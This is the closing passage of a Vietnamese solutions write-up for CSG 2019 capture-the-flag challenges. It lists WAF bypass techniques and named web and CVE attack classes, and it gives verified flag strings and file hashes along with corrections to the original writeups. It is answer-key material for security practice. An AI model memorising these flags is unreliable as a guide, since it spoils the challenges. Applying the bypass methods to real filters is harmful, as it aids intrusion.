đổi hoa/thường, chèn comment (`/**/`), encoding (URL/double/unicode), tách từ khóa, dùng hàm tương đương, HTTP
parameter pollution... Không đủ dữ liệu để đưa flag.


---

## Kết luận & ghi chú kỹ thuật

**Chủ đề nổi bật của CSG 2019:** nhiều bài "encoding nhiều lớp" (Base64 + ROT + fullwidth + charcode), vài bài
"patch nhị phân cổ điển" (UPX, anti-debug, delay), các lỗ hổng web kinh điển (JWT `alg:none`, PHP array bypass +
upload RCE), khai thác CVE public (libssh, Struts2/Tomcat), và forensic cơ bản (sửa header ZIP, giải mã TLS/WPA).

**Giá trị đã kiểm chứng độc lập (không chỉ chép writeup):**
- `ccTLD`: `rot20("tokyo")="niesi"`, `base64("niesi")="bmllc2k="` ✅
- `Fraud`: unhex → fullwidth → NFKC → `VGgzX0VtYjN6emwzcl8xNV9GdW1pZQ==` → `Th3_Emb3zzl3r_15_Fumie` ✅
- `broken user mgmt`: phần trong `{}` = Base64 của "Is the correct answer! Congrats!" ✅
- `present` / `dotnet_branch`: Base64 → đúng flag tương ứng ✅
- `Friend`: `79054025255fb1a26e4bc422aef54eb4` là MD5 cặp va chạm Wang (không phải md5 chuỗi rỗng) ✅
- Hash file: `Shared.zip` & `Intact.pcapng` có md5 **khớp** tên file (nguyên bản); `notepad.zip` &
  `Binary_Ultra.zip` có md5 **khác** tên (đã đóng gói lại) ⚠️

**Các điểm đính chính so với writeup gốc:**
1. `dotnet_branch`: README ghi nhầm `cflag{...}` → đúng là `flag{dotN3T_pr0gr4m_de6ugg1ng_1s_e4sy}`.
2. `notepad?` & `Binary_Ultra-Introduction`: hash trong tên file **không khớp** md5 thật của file trong repo.
3. `Melancholy Holiday (Broken Head)`: writeup gốc **dở dang** ("Under Construction"), chưa có flag — tài liệu
   này đã bổ sung định hướng hoàn chỉnh (sửa magic + Filename Length + phân tích BMP).

**Bài không có lời giải trong repo (README rỗng):** hidden msg, Trim Auth, Binary_Ultra-Introduction, Which,
Record, Calc, Fuzzy, Starting, Notes, PDF-JPGS, Intact, operand mistake, WAF — đã nêu hướng phân tích tĩnh hợp
lý cho từng bài ở trên.

> **An toàn:** toàn bộ phân tích binary trong tài liệu là **tĩnh** (strings/xxd/hash/đọc source/disassemble).
> Mọi bước "chạy file" chỉ nêu để minh họa kết quả theo writeup gốc và cần thực hiện trong **môi trường cách ly
> (VM/Docker)** — không chạy file đề trên máy thật.

*(Bản ngắn gọn ban đầu được lưu tại `SOLUTIONS_VN_short.md` cùng thư mục.)*
